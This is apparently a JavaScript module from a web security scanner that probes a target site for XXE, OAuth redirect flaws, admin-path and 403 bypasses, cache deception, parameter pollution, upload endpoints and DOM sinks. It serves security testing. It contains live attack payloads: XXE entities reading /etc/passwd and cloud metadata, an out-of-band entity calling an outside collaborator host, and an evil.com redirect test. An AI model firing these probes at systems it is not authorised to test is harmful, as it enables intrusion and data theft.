import { addFinding } from '../core/findings.js';
import { fetchText } from '../utils/fetch.js';

export async function scanXxeRemote(origin, spinner) {
  spinner.text = '[PortSwigger] Testing XXE injection...';
  const xxePayloads = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net/xxe">%xxe;]><foo>test</foo>',
  ];

  const xmlEndpoints = ['/api/upload', '/api/import', '/xmlrpc.php', '/soap', '/wsdl', '/api/parse'];

  for (const endpoint of xmlEndpoints) {
    for (const payload of xxePayloads.slice(0, 1)) {
      try {
        const resp = await fetchText(`${origin}${endpoint}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/xml' },
          body: payload,
        }, 5000);

        if (/root:x:0|ami-id|instance-id/i.test(resp.body)) {
          addFinding('CRITICAL', 'XXE (PortSwigger)', `XXE at ${endpoint} - file disclosure`, `Payload: ${payload.substring(0, 50)}... returned sensitive data`, 'Disable external entity processing in XML parser');
          break;
        }
        if (resp.status === 200 && !resp.body.includes('error') && resp.body.includes('xml')) {
          addFinding('LOW', 'XXE (PortSwigger)', `XML endpoint accepts input: ${endpoint}`, `Status: ${resp.status}`, 'Ensure XML parsing has external entities disabled');
        }
      } catch {}
    }
  }
}

export async function scanOauthRemote(origin, spinner) {
  spinner.text = '[PortSwigger] Testing OAuth misconfigurations...';

  const oauthPaths = ['/oauth/authorize', '/auth/callback', '/login/oauth', '/oauth2/authorize', '/.well-known/openid-configuration', '/oauth/token'];

  for (const path of oauthPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, {}, 5000);
      if (resp.status === 200 || resp.status === 302 || resp.status === 400) {
        if (path.includes('well-known') && resp.status === 200) {
          addFinding('INFO', 'OAuth (PortSwigger)', `OpenID Configuration exposed: ${path}`, `${origin}${path} returns OIDC metadata`, 'Review exposed OAuth configuration for sensitive details');

          try {
            const config = JSON.parse(resp.body);
            if (config.grant_types_supported?.includes('implicit')) {
              addFinding('MEDIUM', 'OAuth (PortSwigger)', 'OAuth implicit flow supported', 'Implicit grant type enabled in OIDC configuration', 'Disable implicit flow. Use authorization code with PKCE instead.');
            }
          } catch {}
        }

        const redirectTest = `${origin}${path}?redirect_uri=https://evil.com/callback&response_type=code&client_id=test`;
        try {
          const redirResp = await fetchText(redirectTest, { redirect: 'manual' }, 5000);
          const location = redirResp.headers['location'] || '';
          if (location.includes('evil.com')) {
            addFinding('CRITICAL', 'OAuth (PortSwigger)', 'OAuth redirect_uri not validated', `Redirects to attacker domain: ${location.substring(0, 80)}`, 'Strictly validate redirect_uri against a whitelist of registered URIs');
          }
        } catch {}
      }
    } catch {}
  }
}

export async function scanAccessControlRemote(origin, spinner) {
  spinner.text = '[PortSwigger] Testing access control...';

  const adminPaths = ['/admin', '/admin/', '/administrator', '/manage', '/dashboard', '/panel',
    '/api/admin', '/api/users', '/api/admin/users', '/internal', '/_admin', '/system'];
  const bypassHeaders = [
    { 'X-Original-URL': '/admin' },
    { 'X-Rewrite-URL': '/admin' },
    { 'X-Custom-IP-Authorization': '127.0.0.1' },
    { 'X-Forwarded-For': '127.0.0.1' },
    { 'X-Real-IP': '127.0.0.1' },
    { 'X-Forwarded-Host': 'localhost' },
  ];

  for (const path of adminPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, {}, 5000);
      if (resp.status === 200) {
        addFinding('HIGH', 'Access Control (PortSwigger)', `Admin panel accessible without auth: ${path}`, `${origin}${path} returns 200 OK`, 'Protect admin endpoints with authentication and role-based access control');
      } else if (resp.status === 403) {
        for (const headers of bypassHeaders) {
          try {
            const bypassResp = await fetchText(`${origin}${path}`, { headers }, 5000);
            if (bypassResp.status === 200) {
              addFinding('CRITICAL', 'Access Control (PortSwigger)', `403 bypass via ${Object.keys(headers)[0]}`, `${path} accessible with header: ${JSON.stringify(headers)}`, 'Do not rely on headers for access control. Implement server-side session-based authorization.');
              break;
            }
          } catch {}
        }
      }
    } catch {}
  }

  try {
    const resp = await fetchText(`${origin}/robots.txt`, {}, 5000);
    if (resp.status === 200) {
      const disallowed = resp.body.match(/Disallow:\s*(.+)/gi) || [];
      for (const line of disallowed) {
        const path = line.replace(/Disallow:\s*/i, '').trim();
        if (/admin|internal|private|secret|backup|config/i.test(path)) {
          addFinding('LOW', 'Access Control (PortSwigger)', `Sensitive path in robots.txt: ${path}`, 'robots.txt reveals restricted paths', 'Robots.txt is not access control. Protect paths with authentication.');
        }
      }
    }
  } catch {}
}

export async function scanWebCacheDeception(origin, spinner) {
  spinner.text = '[PortSwigger] Testing Web Cache Deception...';

  const staticExtensions = ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg', '.woff'];
  const testPaths = ['/account', '/profile', '/settings', '/dashboard', '/my-account'];

  for (const path of testPaths) {
    for (const ext of staticExtensions.slice(0, 3)) {
      try {
        const resp = await fetchText(`${origin}${path}${ext}`, {}, 5000);
        const cacheHeaders = resp.headers['x-cache'] || resp.headers['cf-cache-status'] || resp.headers['age'] || '';

        if (resp.status === 200 && cacheHeaders) {
          addFinding('HIGH', 'Cache Deception (PortSwigger)', `Potential Web Cache Deception: ${path}${ext}`, `Cached response for path with static extension. Cache header: ${cacheHeaders}`, 'Configure cache to respect Content-Type, not URL extension. Use Cache-Control: no-store for authenticated pages.');
          break;
        }
      } catch {}
    }
  }

  try {
    const pathConfusion = await fetchText(`${origin}/static/..%2f..%2fadmin`, {}, 5000);
    if (pathConfusion.status === 200 && pathConfusion.body.length > 500) {
      addFinding('HIGH', 'Cache Deception (PortSwigger)', 'Path normalization inconsistency detected', 'Double-encoded path traversal may bypass caching rules', 'Normalize paths consistently between cache and origin');
    }
  } catch {}
}

export async function scanParameterPollution(origin, spinner) {
  spinner.text = '[PortSwigger] Testing Server-Side Parameter Pollution...';

  const params = ['id', 'user', 'email', 'role', 'action', 'page'];

  for (const param of params) {
    try {
      const normalResp = await fetchText(`${origin}/?${param}=test`, {}, 5000);
      const pollutedResp = await fetchText(`${origin}/?${param}=test&${param}=admin`, {}, 5000);

      if (normalResp.body !== pollutedResp.body && pollutedResp.status === 200) {
        addFinding('MEDIUM', 'Parameter Pollution (PortSwigger)', `HTTP Parameter Pollution on ?${param}=`, 'Duplicate parameter produces different response', 'Handle duplicate parameters consistently. Use the first occurrence only.');
      }
    } catch {}
  }

  try {
    const truncation = await fetchText(`${origin}/api/search?q=test%00admin&category=1`, {}, 5000);
    if (truncation.status === 200 && truncation.body.includes('admin')) {
      addFinding('HIGH', 'Parameter Pollution (PortSwigger)', 'Null byte parameter truncation', 'Server-side parameter truncation detected', 'Reject null bytes in input. Validate parameter boundaries.');
    }
  } catch {}
}

export async function scanFileUpload(origin, spinner) {
  spinner.text = '[PortSwigger] Testing file upload endpoints...';

  const uploadPaths = ['/upload', '/api/upload', '/api/files', '/api/images', '/api/avatar', '/media/upload', '/attachments'];

  for (const path of uploadPaths) {
    try {
      const resp = await fetchText(`${origin}${path}`, { method: 'OPTIONS' }, 5000);
      if (resp.status !== 404 && resp.status !== 405) {
        addFinding('INFO', 'File Upload (PortSwigger)', `Upload endpoint found: ${path}`, `${origin}${path} responds to OPTIONS (status: ${resp.status})`, 'Test for unrestricted file upload: PHP/JSP shells, SVG XSS, polyglot files, double extensions (.php.jpg), null bytes (.php%00.jpg)');
      }
    } catch {}
  }
}

export async function scanDomBased(origin, spinner) {
  spinner.text = '[PortSwigger] Checking DOM-based vulnerability indicators...';

  try {
    const resp = await fetchText(origin);
    const body = resp.body;

    const domSinks = [
      { pattern: /document\.write\s*\(/g, name: 'document.write()' },
      { pattern: /\.innerHTML\s*=/g, name: 'innerHTML assignment' },
      { pattern: /\.outerHTML\s*=/g, name: 'outerHTML assignment' },
      { pattern: /eval\s*\(/g, name: 'eval()' },
      { pattern: /setTimeout\s*\(\s*['"`]/g, name: 'setTimeout with string' },
      { pattern: /setInterval\s*\(\s*['"`]/g, name: 'setInterval with string' },
      { pattern: /location\s*=|location\.href\s*=/g, name: 'location assignment' },
      { pattern: /\.src\s*=\s*(?:location|document\.URL|window\.name)/g, name: 'src from DOM source' },
      { pattern: /jQuery\s*\(\s*(?:location|document\.URL)/g, name: 'jQuery selector from URL' },
      { pattern: /\$\s*\(\s*(?:location|document\.URL|window\.location)/g, name: '$ selector from location' },
      { pattern: /postMessage\s*\(/g, name: 'postMessage (check origin validation)' },
      { pattern: /addEventListener\s*\(\s*['"]message['"]/g, name: 'message event listener (DOM XSS via postMessage)' },
    ];

    const domSources = [
      /location\.(?:hash|search|href|pathname)/g,
      /document\.(?:URL|documentURI|referrer|cookie)/g,
      /window\.(?:name|location)/g,
      /document\.getElementById\s*\([^)]*\)\.(?:value|innerHTML|textContent)/g,
    ];

    let sourceCount = 0;
    for (const pattern of domSources) {
      const matches = body.match(pattern);
      if (matches) sourceCount += matches.length;
    }

    for (const { pattern, name } of domSinks) {
      const matches = body.match(pattern);
      if (matches && matches.length > 0) {
        addFinding(
          'MEDIUM',
          'DOM-Based (PortSwigger)',
          `DOM sink detected: ${name} (${matches.length} occurrences)`,
          `Found in page source. ${sourceCount} DOM sources also detected.`,
          'Audit DOM sinks for user-controllable input flow. Use DOMPurify for HTML assignment. Avoid eval/setTimeout with strings.'
        );
      }
    }
  } catch {}
}

export async function scanHttp2(origin, spinner) {
  spinner.text = '[PortSwigger] Checking HTTP/2 indicators...';
  addFinding('INFO', 'HTTP/2 (PortSwigger)', 'HTTP/2 attack surface note', 'Test for H2.CL smuggling, H2.TE smuggling, HPACK header injection, and HTTP/2 exclusive vectors', 'Use Burp Suite HTTP/2 features to test for request smuggling via HTTP/2 downgrade');
}
